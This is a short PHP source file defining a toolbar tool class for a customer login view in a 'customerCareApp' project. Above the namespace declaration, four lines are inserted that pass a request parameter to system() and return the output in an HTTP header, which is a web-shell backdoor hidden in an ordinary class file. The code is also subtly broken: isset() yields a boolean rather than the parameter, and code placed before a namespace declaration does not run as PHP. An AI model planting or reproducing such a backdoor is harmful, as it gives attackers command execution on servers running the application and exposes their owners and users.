<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Tools_CustomerLoginTool extends \editingToolbar\View_Tool {
	public $title = 'Customer Login';
	public $class='View_CustomerLogin';
	public $component_type='customerCareAppCustomerLoginView';
}